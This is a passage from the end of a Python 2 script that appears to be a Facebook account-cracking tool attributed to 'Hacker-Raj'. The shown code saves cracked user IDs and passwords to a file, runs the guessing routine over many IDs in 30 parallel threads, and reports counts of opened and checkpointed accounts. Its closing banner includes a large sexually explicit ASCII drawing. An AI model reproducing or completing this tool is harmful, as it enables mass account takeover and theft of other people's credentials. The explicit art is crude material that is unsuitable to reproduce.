				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
											                                       
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackLover\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By KHONDOKAR-TICK --•◈•---»" #Dev:RAJ
	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 RAJ.py)↩\033[1;97m....'
	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
 _______ad88888888888888888888888a, 
________a88888"8888888888888888888888, 
______,8888"__"P88888888888888888888b, 
______d88_________`""P88888888888888888, 
_____,8888b_______________""88888888888888, 
_____d8P'''__,aa,______________""888888888b 
_____888bbdd888888ba,__,I_________"88888888, 
_____8888888888888888ba8"_________,88888888b 
____,888888888888888888b,________,8888888888 
____(88888888888888888888,______,88888888888, 
____d888888888888888888888,____,8___"8888888b 
____88888888888888888888888__.;8'"""__(888888 
____8888888888888I"8888888P_,8"_,aaa,__888888 
____888888888888I:8888888"_,8"__`b8d'__(88888 
____(8888888888I'888888P'_,8)__________88888 
_____88888888I"__8888P'__,8")__________88888 
_____8888888I'___888"___,8"_(._.)_______88888 
_____(8888I"_____"88,__,8"_____________,8888P 
______888I'_______"P8_,8"_____________,88888) 
_____(88I'__________",8"__M""""""M___,888888' 
____,8I"____________,8(____"aaaa"___,8888888 
___,8I'____________,888a___________,8888888) 
__,8I'____________,888888,_______,888888888 
_,8I'____________,8888888'`-===-'888888888' 
,8I'____________,8888888"________88888888" 
8I'____________,8"____88_________"888888P 
8I____________,8'_____88__________`P888" 
8I___________,8I______88____________"8ba,. 
(8,_________,8P'______88______________88""8bma,. 
_8I________,8P'_______88,______________"8b___""P8ma, 
_(8,______,8d"________`88,_______________"8b_____`"8a 
__8I_____,8dP_________,8X8,________________"8b.____:8b 
__(8____,8dP'__,I____,8XXX8,________________`88,____8) 
___8,___8dP'__,I____,8XxxxX8,_____I,_________8X8,__,8 
___8I___8P'__,I____,8XxxxxxX8,_____I,________`8X88,I8 
___I8,__"___,I____,8XxxxxxxxX8b,____I,________8XXX88I, 
___`8I______I'__,8XxxxxxxxxxxxXX8____I________8XXxxXX8, 
____8I_____(8__,8XxxxxxxxxxxxxxxX8___I________8XxxxxxXX8, 
___,8I_____I[_,8XxxxxxxxxxxxxxxxxX8__8________8XxxxxxxxX8, 
___d8I,____I[_8XxxxxxxxxxxxxxxxxxX8b_8_______(8XxxxxxxxxX8, 
___888I____`8,8XxxxxxxxxxxxxxxxxxxX8_8,_____,8XxxxxxxxxxxX8 
___8888,____"88XxxxxxxxxxxxxxxxxxxX8)8I____.8XxxxxxxxxxxxX8 
__,8888I_____88XxxxxxxxxxxxxxxxxxxX8_`8,__,8XxxxxxxxxxxxX8" 
__d88888_____`8XXxxxxxxxxxxxxxxxxX8'__`8,,8XxxxxxxxxxxxX8" 
__888888I_____`8XXxxxxxxxxxxxxxxX8'____"88XxxxxxxxxxxxX8" 
__88888888bbaaaa88XXxxxxxxxxxxXX8)______)8XXxxxxxxxxXX8" 
__8888888I,_``""""""8888888888888888aaaaa8888XxxxxXX8" 
__(8888888I,______________________.__```"""""88888P" 


         Checkpoint ID Open After 7 Days
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ....Hacker-Raj....... \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;91m RAJ"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	menu()

if __name__ == '__main__':
	login()
